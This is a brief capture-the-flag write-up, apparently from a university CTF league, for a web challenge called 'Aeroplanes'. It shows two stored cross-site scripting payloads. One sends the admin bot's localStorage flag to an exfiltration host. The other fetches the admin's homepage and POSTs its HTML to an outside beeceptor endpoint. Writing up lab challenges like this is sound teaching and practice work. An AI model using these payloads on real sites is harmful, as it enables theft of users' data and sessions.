# Aeroplanes.md
#ctf

### 021924

# Part 1: Hostile Images
After a lot of google-fu we can see that inputs encoded as b64 data. In order to take advantage of this we need to find a input field that is read as html, and a payload to export local storage "FLAG" to our exfil point. The plane description field reads html (found by entering <b>text</b> into every box). We can use this code morphed together from a bunch of SO articles and GPT to create this payload:
```javascript
new Image().src='exfiltrationpoint.com/' + localStorage.getItem(FLAG_Y);
```
Creating a plane with this description and sending the link to the adminbot dumps the flag into our hands.

# Part 2: All your base are belong to us
Working through the source code, we can see that the next flag is stored as a plane on the admin account. We could do a lot of thinking to find out how to just rip the fields we need, or we can just take the entire homepage. This is much easier:
```javascript
fetch('https://aeroplanes.ctf-league.osusec.org/home')
  .then(response => response.text())
  .then(htmlContent => {
    fetch('https://kevin.free.beeceptor.com/', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/html'
      },
      body: htmlContent
    });
  });
```
This dumps the entire html into our hands, where we can just ctrl-f the flag.
